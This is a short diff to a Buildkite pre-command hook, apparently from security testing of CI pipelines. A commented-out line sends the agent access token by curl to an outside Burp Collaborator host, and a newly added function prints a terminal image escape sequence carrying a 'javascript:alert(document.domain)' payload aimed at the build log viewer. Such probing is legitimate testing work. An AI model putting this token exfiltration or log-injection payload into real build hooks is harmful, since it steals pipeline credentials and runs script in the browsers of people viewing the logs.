@@ -1,6 +1,14 @@
 echo "This is an example of a pre-command hook from .buildkite/hooks/pre-command"
-#echo "Intentionally long blocking job to look into this pipeline's access token"
+
+# Test exfiltrating $BUILDKITE_AGENT_ACCESS_TOKEN
 #echo "exfiltrating BUILDKITE_AGENT_ACCESS_TOKEN"
 #curl -X POST exfil.jtglx0umljvnaxnpfm77zbr7vy1ppfd4.burpcollaborator.elttam.au -d "{\"tok\":\"$BUILDKITE_AGENT_ACCESS_TOKEN\"}"
-#sleep 100000
-buildkite-agent oidc request-token --claim "build_id,cluster_id,cluster_name,"
+
+# Test minting OIDC tokens with claims
+#buildkite-agent oidc request-token --claim "build_id,cluster_id,cluster_name,"
+
+# Test Image
+function inline_image {
+  printf '\033]1338;url='"$1"';alt='"$2"'\a\n'
+}
+inline_image 'javascript:alert(document.domain)'
